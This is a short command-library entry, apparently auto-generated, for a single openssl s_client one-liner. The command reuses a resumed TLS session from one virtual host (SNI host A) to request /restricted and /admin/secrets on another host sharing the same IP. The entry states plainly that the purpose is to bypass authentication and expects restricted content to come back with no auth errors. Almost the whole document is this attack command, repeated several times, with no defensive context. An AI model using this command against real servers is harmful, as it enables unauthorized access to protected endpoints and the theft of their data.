---
data: >-
  printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl
  s_client -connect shared-ip.example.com:443 -tls1_3 -servername
  hostA.example.com -sess_in resumed_session.pem
tags:
  - http
  - restricted
  - access
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.091Z'
id: da553a9d-cc5f-434f-87f2-d5be289d13c1
verified: false
validated: true
submitted: true
---
# printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem

## Command

```bash
printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

## Description

Accesses a restricted endpoint on host B over the resumed TLS session to bypass authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf` | HTTP GET to restricted path | Yes |
| `Host:` | Virtual host B | Yes |
| `openssl s_client` | Resumed TLS connection | Yes |

## Examples

### Basic Usage

```bash
printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

### Advanced Usage

```bash
printf "GET /admin/secrets HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

## Expected Output

Successful HTTP response with restricted content, no auth errors.

## Related

- [[Related Procedure]]
